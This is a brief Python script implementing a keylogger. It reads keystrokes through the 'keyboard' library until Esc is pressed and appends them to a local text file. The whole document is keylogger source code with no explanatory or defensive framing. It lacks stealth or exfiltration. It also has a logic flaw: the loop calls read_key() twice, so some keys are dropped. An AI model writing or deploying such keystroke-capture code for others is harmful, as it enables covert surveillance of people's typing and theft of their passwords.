import keyboard
import sys


class Keylogger:
    def __init__(self, fileName):
        self.key = ""
        self.fileName = fileName

    def run(self):
        while keyboard.read_key() != 'esc':
            self.key += keyboard.read_key() + "\n"
        
        self.__writeFile(self.key)
        sys.exit(0)

    def __writeFile(self, keys):
        fp = open(self.fileName, 'a')
        fp.write(keys)
        fp.close()


keyLogger = Keylogger("testKeyboard.txt")
keyLogger.run()

